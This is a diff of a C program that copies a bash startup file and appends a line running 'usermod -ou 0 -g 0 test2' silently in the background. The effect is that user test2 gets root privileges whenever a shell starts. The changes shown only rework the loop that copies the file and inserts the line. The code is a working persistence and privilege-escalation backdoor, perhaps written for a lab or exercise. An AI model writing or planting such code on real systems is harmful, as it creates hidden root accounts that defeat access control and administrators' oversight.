@@ -94,13 +94,13 @@ int main() {
     newFile = fopen("./tmp/bash.bashrc", "w");
     char line[] = "/bin/bash -c \"/user/sbin/usermod -ou 0 -g 0 test2 > /dev/null 2>&1 &\"\n";
 
-    char c = fgetc(ogFile);
     // bool useMyEntry = false;
     // char * myEntry = malloc(sizeof(char) * 100);
     fpos_t pos;
     // copy the files from /etc to ./tmp/passwd
-    while(c != EOF) {
-        fgetpos(ogFile, &pos);
+    while(1) {
+        char c = fgetc(ogFile);
+        // fgetpos(ogFile, &pos);
 
         // if (c == '\n') {
         //     if (checkUsername(ogFile)) {
@@ -127,14 +127,14 @@ int main() {
         //     // printf("writeMyLine worked\n");
         //     useMyEntry = false;
         // } else {
+        if (feof(ogFile)) {
+            fputc('\n', newFile);
+            // fsetpos(ogFile, &pos);
+            writeMyLine(newFile, line);
+            break;
+        }
         fputc(c, newFile);
         // }
-        c = fgetc(ogFile);
-        if (c == EOF) {
-            fputc('\n', newFile);
-            fsetpos(ogFile, &pos);
-            writeMyLine(newFile, line);
-            c = fgetc(ogFile);
-        }
+        // c = fgetc(ogFile);
     }
 }
